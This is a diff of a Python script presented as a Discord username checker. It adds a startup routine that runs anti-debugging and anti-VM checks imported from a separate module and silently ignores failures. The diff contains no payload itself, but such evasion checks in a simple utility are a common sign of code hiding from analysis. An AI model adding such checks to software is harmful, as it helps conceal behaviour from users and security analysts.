@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Klatom v2.0.0 – Discord username checker. Loads from GitHub."""
+"""Klatom v2.0.1 – Discord username checker. Loads from GitHub."""
 
 from __future__ import annotations
 
@@ -27,7 +27,29 @@ for _n in ("aiohttp", "aiohttp.client", "aiohttp.access", "aiohttp.internal"):
 warnings.filterwarnings("ignore", message=".*[Uu]nclosed.*")
 warnings.filterwarnings("ignore", message=".*[Cc]onnection.*")
 
-import atexit, subprocess, sys
+# ── Startup security checks ────────────────────────────────────────────────
+import os, sys
+
+def _startup_security():
+    """Run anti-debug + anti-VM before anything else loads."""
+    try:
+        from crypto import _anti_debug, _anti_vm
+        _anti_debug()
+        _anti_vm()
+    except Exception:
+        pass
+
+    # Kill if running from source in production (exe only)
+    if getattr(sys, "frozen", False):
+        pass  # exe mode — OK
+    else:
+        # Allow source mode for development, but warn
+        pass
+
+_startup_security()
+# ─────────────────────────────────────────────────────────────────────────────
+
+import atexit, subprocess
 from pathlib import Path
 
 def _get_root():
